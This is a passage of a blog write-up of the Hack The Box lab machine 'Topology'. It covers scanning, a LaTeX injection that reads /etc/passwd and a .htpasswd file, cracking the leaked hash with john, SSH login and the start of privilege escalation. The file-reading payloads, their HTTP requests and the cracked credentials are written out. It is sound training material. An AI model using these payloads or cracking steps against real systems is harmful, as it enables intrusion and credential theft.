<!DOCTYPE html>
<html lang="en">
<head>
  
    <title>HTB Writeup - Topology (Easy) :: CyberSpider</title>
  
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="description" content="Writeup of Topology from Hack The Box." />
<meta name="keywords" content="" />

  <meta name="robots" content="noodp" />

<link rel="canonical" href="/posts/topology/" />






  
  
  
  
  
  <link rel="stylesheet" href="/styles.css">



<link rel="stylesheet" href="/style.css">



  <link rel="shortcut icon" href="/img/theme-colors/green.png">
  <link rel="apple-touch-icon" href="/img/theme-colors/green.png">



<meta name="twitter:card" content="summary" />

  
    <meta name="twitter:site" content="" />
  
    <meta name="twitter:creator" content="CyberSpider" />



<meta property="og:locale" content="en" />
<meta property="og:type" content="article" />
<meta property="og:title" content="HTB Writeup - Topology (Easy)">
<meta property="og:description" content="Writeup of Topology from Hack The Box." />
<meta property="og:url" content="/posts/topology/" />
<meta property="og:site_name" content="CyberSpider" />

  
    <meta property="og:image" content="/img/favicon/green.png">
  

<meta property="og:image:width" content="1200">
<meta property="og:image:height" content="627">


  <meta property="article:published_time" content="2023-07-08 00:00:00 &#43;0000 UTC" />












</head>
<body class="green">


<div class="container full headings--one-size">

  <header class="header">
  <div class="header__inner">
    <div class="header__logo">
      <a href="/">
  <div class="logo">
    cyberspider@ubuntu:~$
  </div>
</a>

    </div>
    
      <ul class="menu menu--mobile">
  <li class="menu__trigger">Menu&nbsp;▾</li>
  <li>
    <ul class="menu__dropdown">
      
        
          <li><a href="/archive">archive</a></li>
        
      
        
          <li><a href="/whoami">whoami</a></li>
        
      
      
    </ul>
  </li>
</ul>

    
    
  </div>
  
    <nav class="navigation-menu">
  <ul class="navigation-menu__inner menu--desktop">
    
      
        
          <li><a href="/archive" >archive</a></li>
        
      
        
          <li><a href="/whoami" >whoami</a></li>
        
      
      
    
  </ul>
</nav>

  
</header>


  <div class="content">
    
<article class="post">
  <h1 class="post-title">
    <a href="/posts/topology/">HTB Writeup - Topology (Easy)</a>
  </h1>
  <div class="post-meta"><time class="post-date">2023-07-08</time><span class="post-author">CyberSpider</span></div>

  
    <span class="post-tags">
      
      #<a href="/tags/htb/">htb</a>&nbsp;
      
      #<a href="/tags/easy/">easy</a>&nbsp;
      
      #<a href="/tags/linux/">linux</a>&nbsp;
      
      #<a href="/tags/latex_injection/">LaTex_Injection</a>&nbsp;
      
    </span>
  
  


  

  <div class="post-content"><div>
        <p>The <code>Topology</code> machine is an easy linux box.</p>
<p><img src="/images/Topology.png#center" alt="Scenario 1: Across columns"></p>
<h2 id="nmap-scan">Nmap Scan<a href="#nmap-scan" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
<p>I do a scan with <code>nmap</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─$ nmap -A -sV -sC 10.10.11.217
</span></span><span style="display:flex;"><span>Starting Nmap 7.93 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2023-06-14 11:25 EDT
</span></span><span style="display:flex;"><span>Stats: 0:00:18 elapsed; <span style="color:#ae81ff">0</span> hosts completed <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> up<span style="color:#f92672">)</span>, <span style="color:#ae81ff">1</span> undergoing Service Scan
</span></span><span style="display:flex;"><span>Service scan Timing: About 50.00% <span style="color:#66d9ef">done</span>; ETC: 11:25 <span style="color:#f92672">(</span>0:00:16 remaining<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Stats: 0:00:24 elapsed; <span style="color:#ae81ff">0</span> hosts completed <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> up<span style="color:#f92672">)</span>, <span style="color:#ae81ff">1</span> undergoing Script Scan
</span></span><span style="display:flex;"><span>NSE Timing: About 96.47% <span style="color:#66d9ef">done</span>; ETC: 11:25 <span style="color:#f92672">(</span>0:00:00 remaining<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.11.217
</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.045s latency<span style="color:#f92672">)</span>.
</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">998</span> closed tcp ports <span style="color:#f92672">(</span>conn-refused<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>PORT   STATE SERVICE VERSION
</span></span><span style="display:flex;"><span>22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>| ssh-hostkey: 
</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">3072</span> dcbc3286e8e8457810bc2b5dbf0f55c6 <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> d9f339692c6c27f1a92d506ca79f1c33 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|_  <span style="color:#ae81ff">256</span> 4ca65075d0934f9c4a1b890a7a2708d7 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>80/tcp open  http    Apache httpd 2.4.41
</span></span><span style="display:flex;"><span>|_http-server-header: Apache/2.4.41 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|_http-title: Miskatonic University | Topology Group
</span></span><span style="display:flex;"><span>Service Info: Host: topology.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 74.79 seconds
</span></span></code></pre></div><p>I edit this file <code>/etc/hosts</code> in this way:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─$ sudo nano /etc/hosts                       
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>sudo<span style="color:#f92672">]</span> password <span style="color:#66d9ef">for</span> kali: 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─$ cat /etc/hosts
</span></span><span style="display:flex;"><span>127.0.0.1       localhost
</span></span><span style="display:flex;"><span>127.0.1.1       kali
</span></span><span style="display:flex;"><span>::1             localhost ip6-localhost ip6-loopback
</span></span><span style="display:flex;"><span>ff02::1         ip6-allnodes
</span></span><span style="display:flex;"><span>ff02::2         ip6-allrouters
</span></span><span style="display:flex;"><span>10.10.11.217    topology.htb
</span></span></code></pre></div><h2 id="http">HTTP<a href="#http" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
<p>I check the source code of the main page, and I find a subdomain hide:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">         &lt;div class=&#34;w3-container&#34;&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            &lt;p&gt;• &lt;a href=&#34;http://latex.topology.htb/equation.php&#34;&gt;LaTeX Equation Generator&lt;/a&gt; - create .PNGs of LaTeX
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">              equations in your browser&lt;/p&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            &lt;p&gt;• PHPMyRefDB - web application to manage journal citations, with BibTeX support! (currenty in
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">              development)&lt;/p&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            &lt;p&gt;• TopoMisk - Topology tool suite by L. Klein and V. Daisley. Download link upon request.&lt;/p&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            &lt;p&gt;• PlotoTopo - A collection of Gnuplot scripts to aide in visualization of topoligical problems. Legacy, source code
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">              upon request.&lt;/p&gt;
</span></span></span></code></pre></div><p>I edit this file <code>/etc/hosts</code> in this way:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─$ sudo nano /etc/hosts                       
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>sudo<span style="color:#f92672">]</span> password <span style="color:#66d9ef">for</span> kali: 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─$ cat /etc/hosts
</span></span><span style="display:flex;"><span>127.0.0.1       localhost
</span></span><span style="display:flex;"><span>127.0.1.1       kali
</span></span><span style="display:flex;"><span>::1             localhost ip6-localhost ip6-loopback
</span></span><span style="display:flex;"><span>ff02::1         ip6-allnodes
</span></span><span style="display:flex;"><span>ff02::2         ip6-allrouters
</span></span><span style="display:flex;"><span>10.10.11.217    topology.htb
</span></span><span style="display:flex;"><span>10.10.11.217    latex.topology.htb
</span></span></code></pre></div><h2 id="directory-enumeration">Directory Enumeration<a href="#directory-enumeration" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
<p>I do a directory enumeration with <code>ffuf</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─$ ffuf -w /usr/share/seclists/Discovery/Web-Content/big.txt  -u  http://latex.topology.htb/FUZZ
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        /<span style="color:#e6db74">&#39;___\  /&#39;</span>___<span style="color:#ae81ff">\ </span>          /<span style="color:#960050;background-color:#1e0010">&#39;</span>___<span style="color:#ae81ff">\ </span>      
</span></span><span style="display:flex;"><span>       /<span style="color:#ae81ff">\ \_</span>_/ /<span style="color:#ae81ff">\ \_</span>_/  __  __  /<span style="color:#ae81ff">\ \_</span>_/       
</span></span><span style="display:flex;"><span>       <span style="color:#ae81ff">\ \ </span>,__<span style="color:#ae81ff">\\</span> <span style="color:#ae81ff">\ </span>,__<span style="color:#ae81ff">\/\ \/\ \ \ \ </span>,__<span style="color:#ae81ff">\ </span>     
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">\ \ \_</span>/ <span style="color:#ae81ff">\ \ \_</span>/<span style="color:#ae81ff">\ \ \_\ \ \ \ \_</span>/      
</span></span><span style="display:flex;"><span>         <span style="color:#ae81ff">\ \_\ </span>  <span style="color:#ae81ff">\ \_\ </span> <span style="color:#ae81ff">\ \_</span>___/  <span style="color:#ae81ff">\ \_\ </span>      
</span></span><span style="display:flex;"><span>          <span style="color:#ae81ff">\/</span>_/    <span style="color:#ae81ff">\/</span>_/   <span style="color:#ae81ff">\/</span>___/    <span style="color:#ae81ff">\/</span>_/       
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>       v2.0.0-dev
</span></span><span style="display:flex;"><span>________________________________________________
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span> :: Method           : GET
</span></span><span style="display:flex;"><span> :: URL              : http://latex.topology.htb/FUZZ
</span></span><span style="display:flex;"><span> :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/big.txt
</span></span><span style="display:flex;"><span> :: Follow redirects : false
</span></span><span style="display:flex;"><span> :: Calibration      : false
</span></span><span style="display:flex;"><span> :: Timeout          : <span style="color:#ae81ff">10</span>
</span></span><span style="display:flex;"><span> :: Threads          : <span style="color:#ae81ff">40</span>
</span></span><span style="display:flex;"><span> :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
</span></span><span style="display:flex;"><span>________________________________________________
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>Status: 403, Size: 283, Words: 20, Lines: 10, Duration: 2825ms<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>    * FUZZ: .htaccess
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>Status: 403, Size: 283, Words: 20, Lines: 10, Duration: 4148ms<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>    * FUZZ: .htpasswd
</span></span></code></pre></div><h2 id="latex-injection">LaTex Injection<a href="#latex-injection" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
<p>This page has to particular function, I insert a equation in the form and this function convert this write equation  in image, I search in the web any <code>LaTeX Injection</code>, because this function take the name of LaTeX, after a bit of search I find this page <code>https://book.hacktricks.xyz/pentesting-web/formula-doc-latex-injection</code>:</p>
<ul>
<li>Payloads:</li>
</ul>
<pre tabindex="0"><code>$\lstinputlisting{/etc/passwd}$
$\lstinputlisting{/var/www/dev/.htpasswd}$
</code></pre><ul>
<li>Request:</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#a6e22e">GET</span> /equation.php?eqn=%24%5Clstinputlisting%7B%2Fetc%2Fpasswd%7D%24&amp;submit= <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
</span></span><span style="display:flex;"><span>Host<span style="color:#f92672">:</span> <span style="color:#ae81ff">latex.topology.htb</span>
</span></span><span style="display:flex;"><span>Upgrade-Insecure-Requests<span style="color:#f92672">:</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>User-Agent<span style="color:#f92672">:</span> <span style="color:#ae81ff">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.134 Safari/537.36</span>
</span></span><span style="display:flex;"><span>Accept<span style="color:#f92672">:</span> <span style="color:#ae81ff">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span>
</span></span><span style="display:flex;"><span>Referer<span style="color:#f92672">:</span> <span style="color:#ae81ff">http://latex.topology.htb/equation.php</span>
</span></span><span style="display:flex;"><span>Accept-Encoding<span style="color:#f92672">:</span> <span style="color:#ae81ff">gzip, deflate</span>
</span></span><span style="display:flex;"><span>Accept-Language<span style="color:#f92672">:</span> <span style="color:#ae81ff">en-US,en;q=0.9</span>
</span></span><span style="display:flex;"><span>Connection<span style="color:#f92672">:</span> <span style="color:#ae81ff">close</span>
</span></span></code></pre></div><ul>
<li>Response:</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span> <span style="color:#ae81ff">200</span> <span style="color:#a6e22e">OK</span>
</span></span><span style="display:flex;"><span>Date<span style="color:#f92672">:</span> <span style="color:#ae81ff">Sat, 08 Jul 2023 16:45:42 GMT</span>
</span></span><span style="display:flex;"><span>Server<span style="color:#f92672">:</span> <span style="color:#ae81ff">Apache/2.4.41 (Ubuntu)</span>
</span></span><span style="display:flex;"><span>Content-Length<span style="color:#f92672">:</span> <span style="color:#ae81ff">239764</span>
</span></span><span style="display:flex;"><span>Connection<span style="color:#f92672">:</span> <span style="color:#ae81ff">close</span>
</span></span><span style="display:flex;"><span>Content-Type<span style="color:#f92672">:</span> <span style="color:#ae81ff">image/png</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>PNG
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>...
</span></span></code></pre></div><p>Now I try to see this file <code>/var/www/dev/.htpasswd</code>:</p>
<ul>
<li>Request:</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#a6e22e">GET</span> /equation.php?eqn=%24%5Clstinputlisting%7B%2Fvar%2Fwww%2Fdev%2F.htpasswd%7D%24&amp;submit= <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
</span></span><span style="display:flex;"><span>Host<span style="color:#f92672">:</span> <span style="color:#ae81ff">latex.topology.htb</span>
</span></span><span style="display:flex;"><span>Upgrade-Insecure-Requests<span style="color:#f92672">:</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>User-Agent<span style="color:#f92672">:</span> <span style="color:#ae81ff">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.134 Safari/537.36</span>
</span></span><span style="display:flex;"><span>Accept<span style="color:#f92672">:</span> <span style="color:#ae81ff">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span>
</span></span><span style="display:flex;"><span>Referer<span style="color:#f92672">:</span> <span style="color:#ae81ff">http://latex.topology.htb/equation.php</span>
</span></span><span style="display:flex;"><span>Accept-Encoding<span style="color:#f92672">:</span> <span style="color:#ae81ff">gzip, deflate</span>
</span></span><span style="display:flex;"><span>Accept-Language<span style="color:#f92672">:</span> <span style="color:#ae81ff">en-US,en;q=0.9</span>
</span></span><span style="display:flex;"><span>Connection<span style="color:#f92672">:</span> <span style="color:#ae81ff">close</span>
</span></span></code></pre></div><ul>
<li>Response:</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span> <span style="color:#ae81ff">200</span> <span style="color:#a6e22e">OK</span>
</span></span><span style="display:flex;"><span>Date<span style="color:#f92672">:</span> <span style="color:#ae81ff">Sat, 08 Jul 2023 16:55:05 GMT</span>
</span></span><span style="display:flex;"><span>Server<span style="color:#f92672">:</span> <span style="color:#ae81ff">Apache/2.4.41 (Ubuntu)</span>
</span></span><span style="display:flex;"><span>Content-Length<span style="color:#f92672">:</span> <span style="color:#ae81ff">7546</span>
</span></span><span style="display:flex;"><span>Connection<span style="color:#f92672">:</span> <span style="color:#ae81ff">close</span>
</span></span><span style="display:flex;"><span>Content-Type<span style="color:#f92672">:</span> <span style="color:#ae81ff">image/png</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>PNG
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>...
</span></span></code></pre></div><ul>
<li>This is written in the image:</li>
</ul>
<pre tabindex="0"><code>vdaisley:$apr1$1ONUB/S2$58eeNVirnRDB5zAIbIxTY0
</code></pre><p>I use <code>john</code> to crack this hash:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─$ nano cred         
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─$ cat cred                      
</span></span><span style="display:flex;"><span>vdaisley:$apr1$1ONUB/S2$58eeNVirnRDB5zAIbIxTY0
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─$ john cred   -wordlist:/usr/share/wordlists/rockyou.txt  
</span></span><span style="display:flex;"><span>Warning: detected hash type <span style="color:#e6db74">&#34;md5crypt&#34;</span>, but the string is also recognized as <span style="color:#e6db74">&#34;md5crypt-long&#34;</span>
</span></span><span style="display:flex;"><span>Use the <span style="color:#e6db74">&#34;--format=md5crypt-long&#34;</span> option to force loading these as that type instead
</span></span><span style="display:flex;"><span>Using default input encoding: UTF-8
</span></span><span style="display:flex;"><span>Loaded <span style="color:#ae81ff">1</span> password hash <span style="color:#f92672">(</span>md5crypt, crypt<span style="color:#f92672">(</span>3<span style="color:#f92672">)</span> $1$ <span style="color:#f92672">(</span>and variants<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>MD5 256/256 AVX2 8x3<span style="color:#f92672">])</span>
</span></span><span style="display:flex;"><span>Will run <span style="color:#ae81ff">2</span> OpenMP threads
</span></span><span style="display:flex;"><span>Press <span style="color:#e6db74">&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span style="color:#66d9ef">for</span> status
</span></span><span style="display:flex;"><span>calculus20       <span style="color:#f92672">(</span>vdaisley<span style="color:#f92672">)</span>     
</span></span><span style="display:flex;"><span>1g 0:00:00:08 DONE <span style="color:#f92672">(</span>2023-07-08 13:00<span style="color:#f92672">)</span> 0.1190g/s 118537p/s 118537c/s 118537C/s calebd1..caitlyn09
</span></span><span style="display:flex;"><span>Use the <span style="color:#e6db74">&#34;--show&#34;</span> option to display all of the cracked passwords reliably
</span></span><span style="display:flex;"><span>Session completed. 
</span></span></code></pre></div><p>I find the credentials to ssh:</p>
<pre tabindex="0"><code>vdaisley:calculus20
</code></pre><p>I login to <code>ssh</code> and I take the  flag(<code>user.txt</code>):</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─$ ssh vdaisley@topology.htb    
</span></span><span style="display:flex;"><span>The authenticity of host <span style="color:#e6db74">&#39;topology.htb (10.10.11.217)&#39;</span> can<span style="color:#e6db74">&#39;t be established.
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">ED25519 key fingerprint is SHA256:F9cjnqv7HiOrntVKpXYGmE9oEaCfHm5pjfgayE/0OK0.
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">This key is not known by any other names.
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Warning: Permanently added &#39;</span>topology.htb<span style="color:#e6db74">&#39; (ED25519) to the list of known hosts.
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">vdaisley@topology.htb&#39;</span>s password: 
</span></span><span style="display:flex;"><span>Welcome to Ubuntu 20.04.6 LTS <span style="color:#f92672">(</span>GNU/Linux 5.4.0-150-generic x86_64<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Expanded Security Maintenance <span style="color:#66d9ef">for</span> Applications is not enabled.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span> updates can be applied immediately.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Enable ESM Apps to receive additional future security updates.
</span></span><span style="display:flex;"><span>See https://ubuntu.com/esm or run: sudo pro status
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>The list of available updates is more than a week old.
</span></span><span style="display:flex;"><span>To check <span style="color:#66d9ef">for</span> new updates run: sudo apt update
</span></span><span style="display:flex;"><span>Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Last login: Sat Jul  <span style="color:#ae81ff">8</span> 11:32:25 <span style="color:#ae81ff">2023</span> from 10.10.15.117
</span></span><span style="display:flex;"><span>-bash-5.0$ ls -all
</span></span><span style="display:flex;"><span>total <span style="color:#ae81ff">3072</span>
</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">5</span> vdaisley vdaisley    <span style="color:#ae81ff">4096</span> Jul  <span style="color:#ae81ff">8</span> 11:36 .
</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">3</span> root     root        <span style="color:#ae81ff">4096</span> May <span style="color:#ae81ff">19</span> 13:04 ..
</span></span><span style="display:flex;"><span>lrwxrwxrwx <span style="color:#ae81ff">1</span> root     root           <span style="color:#ae81ff">9</span> Mar <span style="color:#ae81ff">13</span>  <span style="color:#ae81ff">2022</span> .bash_history -&gt; /dev/null
</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#ae81ff">1</span> vdaisley vdaisley     <span style="color:#ae81ff">220</span> Jan <span style="color:#ae81ff">17</span> 12:26 .bash_logout
</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#ae81ff">1</span> vdaisley vdaisley    <span style="color:#ae81ff">3771</span> Jan <span style="color:#ae81ff">17</span> 12:26 .bashrc
</span></span><span style="display:flex;"><span>drwx------ <span style="color:#ae81ff">2</span> vdaisley vdaisley    <span style="color:#ae81ff">4096</span> May <span style="color:#ae81ff">19</span> 13:04 .cache
</span></span><span style="display:flex;"><span>drwx------ <span style="color:#ae81ff">3</span> vdaisley vdaisley    <span style="color:#ae81ff">4096</span> May <span style="color:#ae81ff">19</span> 13:04 .config
</span></span><span style="display:flex;"><span>drwx------ <span style="color:#ae81ff">3</span> vdaisley vdaisley    <span style="color:#ae81ff">4096</span> Jul  <span style="color:#ae81ff">8</span> 11:36 .gnupg
</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#ae81ff">1</span> vdaisley vdaisley     <span style="color:#ae81ff">807</span> Jan <span style="color:#ae81ff">17</span> 12:26 .profile
</span></span><span style="display:flex;"><span>-rw-r----- <span style="color:#ae81ff">1</span> root     vdaisley      <span style="color:#ae81ff">33</span> Jul  <span style="color:#ae81ff">8</span> 10:55 user.txt
</span></span><span style="display:flex;"><span>-rw------- <span style="color:#ae81ff">1</span> vdaisley vdaisley    <span style="color:#ae81ff">1561</span> Jul  <span style="color:#ae81ff">8</span> 11:22 .viminfo
</span></span><span style="display:flex;"><span>-bash-5.0$ cat user.txt
</span></span><span style="display:flex;"><span>11cde4a53f417ee4767947190027b00d
</span></span></code></pre></div><h2 id="vertical-privilege-escalation">Vertical Privilege Escalation<a href="#vertical-privilege-escalation" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
<p>With <code>pspy64</code> I discover that I can write to <code>/opt/gnuplot</code> directory, but not read it:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>-bash-5.0$ ./pspy64
</span></span><span style="display:flex;"><span>pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>     ██▓███    ██████  ██▓███ ▓██   ██▓
</span></span><span style="display:flex;"><span>    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
</span></span><span style="display:flex;"><span>    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
</span></span><span style="display:flex;"><span>    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
</span></span><span style="display:flex;"><span>    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
